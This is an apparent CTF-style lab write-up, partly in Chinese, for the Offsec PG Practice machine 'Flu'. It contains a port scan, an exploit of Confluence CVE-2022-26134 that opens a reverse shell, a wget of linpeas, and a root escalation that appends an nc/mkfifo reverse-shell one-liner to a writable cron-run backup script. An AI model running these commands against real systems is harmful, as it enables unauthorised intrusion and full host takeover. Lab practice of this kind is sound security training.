###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Flu
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.219.41 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.219.41:22
Open 192.168.219.41:8090
Open 192.168.219.41:8091

PORT     STATE SERVICE       REASON  VERSION
22/tcp   open  ssh           syn-ack OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
8090/tcp open  opsmessaging? syn-ack
8091/tcp open  jamlink?      syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Mon, 01 Apr 2024 08:45:01 GMT
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Mon, 01 Apr 2024 08:44:26 GMT
|     Connection: Close
```

搜尋[CVE-2022-26134](https://github.com/jbaines-r7/through_the_wire/tree/main)然後用他就得到Reverseshell，在`/home/confluence`得到local.txt
```
┌──(kali㉿kali)-[~/pgplay/through_the_wire]
└─$ python3 through_the_wire.py --rhost 192.168.182.41 --rport 8090 --lhost 192.168.45.229 --protocol http:// --reverse-shell

confluence@flu:/home/confluence$ cat local.txt
8e169490ea5cba5c9b6ad3bb48b18297
```

使用`linpeas.sh`，看到有一個`/opt/log-backup.sh`，可以塞shell然後等反彈
```
confluence@flu:/tmp$ wget 192.168.45.229/linpeas.sh
confluence@flu:/tmp$ chmod +x linpeas.sh
confluence@flu:/tmp$ ./linpeas.sh


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                         
                            ╚═════════════════════════╝                                                                                     
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                  
/usr/bin/rescan-scsi-bus.sh                                                                                                                 
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2024-04-02+02:14:12.9519030790 /tmp/nc                                                                                                      
2024-04-02+01:54:28.9679581970 /tmp/shell
2023-12-12+11:01:43.0570688480 /opt/log-backup.sh
...
```

等反彈拿到root，在/root可拿到proof.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

confluence@flu:/opt$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.229 9001 >/tmp/f" >> log-backup.sh

# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@flu:~# cat proof.txt
92286df930120d2a2b1d6a78d5b43ab7
```